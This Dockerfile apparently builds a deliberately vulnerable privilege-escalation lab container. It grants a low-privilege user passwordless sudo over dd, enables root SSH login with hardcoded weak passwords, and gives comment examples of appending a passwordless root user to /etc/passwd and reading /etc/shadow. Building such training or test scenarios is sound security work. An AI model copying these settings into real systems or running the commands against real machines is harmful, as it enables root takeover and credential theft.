FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_dd
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/dd as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and coreutils (dd is part of coreutils)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        coreutils \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify dd is installed
RUN which dd && ls -la /usr/bin/dd

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# dd can read and write arbitrary files when run as root.
# Exploit approach: use dd to read sensitive files like /etc/shadow,
# or overwrite /etc/passwd to inject a root-level user entry.
# Example: echo "root2::0:0:root2:/root:/bin/bash" | sudo dd of=/etc/passwd conv=notrunc oflag=append
# Or: sudo dd if=/etc/shadow  (to read shadow file)
# This enables full root compromise by writing a passwordless root user into /etc/passwd.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/dd" > /etc/sudoers.d/dd && \
    chmod 440 /etc/sudoers.d/dd

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]